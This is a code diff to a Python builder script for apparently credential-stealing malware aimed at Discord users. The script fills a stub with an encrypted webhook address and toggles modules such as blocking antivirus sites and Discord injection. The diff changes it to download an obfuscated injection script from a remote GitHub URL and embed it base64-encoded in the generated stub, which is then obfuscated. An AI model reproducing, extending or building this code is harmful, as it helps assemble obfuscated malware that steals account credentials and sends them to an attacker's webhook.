@@ -1,13 +1,14 @@
 import json
 import base64
 import os
+import urllib3
 
 import BlankOBF as obfuscator
 
 SettingsFile = "config.json"
-InjectionFile = "injection-obfuscated.js"
 InCodeFile = "stub.py"
 OutCodeFile = "stub-o.py"
+InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('"%webhook%"', EncryptString(settings["settings"]["webhook"]))
@@ -35,7 +36,9 @@ def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
     code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")
 
-    code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
+
+    if injection is not None:
+        code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
     
     return code
 
@@ -46,9 +49,13 @@ def ReadSettings() -> tuple[dict, str]:
         with open(SettingsFile) as file:
             settings = json.load(file)
 
-    if os.path.isfile(InjectionFile):
-        with open(InjectionFile, encoding= "utf-8", errors= "ignore") as file:
-            injection = file.read()
+    try:
+        poolManager = urllib3.PoolManager()
+        injection = poolManager.request("GET", InjectionURL).data.decode().strip()
+        if not "discord.com" in injection:
+            injection = None
+    except Exception:
+        injection = None
     
     return (settings, injection)
 
